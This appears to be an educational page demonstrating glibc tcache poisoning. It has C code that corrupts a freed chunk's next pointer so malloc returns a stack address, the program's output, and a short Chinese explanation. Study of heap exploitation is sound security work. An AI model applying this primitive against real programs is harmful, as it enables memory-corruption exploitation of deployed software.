# tcache_poisoning

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// disable buffering
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
		   "returning a pointer to an arbitrary location (in this case, the stack).\n"
		   "The attack is very similar to fastbin corruption attack.\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
		   "We have to create and free one more chunk for padding before fd pointer hijacking.\n\n");

	size_t stack_var;
	printf("The address we want malloc() to return is %p.\n", (char *)&stack_var);

	printf("Allocating 2 buffers.\n");
	intptr_t *a = malloc(128);
	printf("malloc(128): %p\n", a);
	intptr_t *b = malloc(128);
	printf("malloc(128): %p\n", b);

	printf("Freeing the buffers...\n");
	free(a);
	free(b);

	printf("Now the tcache list has [ %p -> %p ].\n", b, a);
	printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		   "to point to the location to control (%p).\n", sizeof(intptr_t), b, &stack_var);
	b[0] = (intptr_t)&stack_var;
	printf("Now the tcache list has [ %p -> %p ].\n", b, &stack_var);

	printf("1st malloc(128): %p\n", malloc(128));
	printf("Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *c = malloc(128);
	printf("2nd malloc(128): %p\n", c);
	printf("We got the control\n");

	assert((long)&stack_var == (long)c);
	return 0;
}
```

**result**

```c
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.
After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,
We have to create and free one more chunk for padding before fd pointer hijacking.

The address we want malloc() to return is 0x7ffd934a7938.
Allocating 2 buffers.
malloc(128): 0x55b7c3b8f260
malloc(128): 0x55b7c3b8f2f0
Freeing the buffers...
Now the tcache list has [ 0x55b7c3b8f2f0 -> 0x55b7c3b8f260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55b7c3b8f2f0
to point to the location to control (0x7ffd934a7938).
Now the tcache list has [ 0x55b7c3b8f2f0 -> 0x7ffd934a7938 ].
1st malloc(128): 0x55b7c3b8f2f0
Now the tcache list has [ 0x7ffd934a7938 ].
2nd malloc(128): 0x7ffd934a7938
We got the control
```

**analysis**

申请两个chunk a，b，然后free，这时它们会进入tcache，修改b的fd指针，使其指向栈上的空间。

连续两次申请后我们获得了栈上的空间，可以发现，在tcahe中伪造chunk，比在fastbin中容易太多了，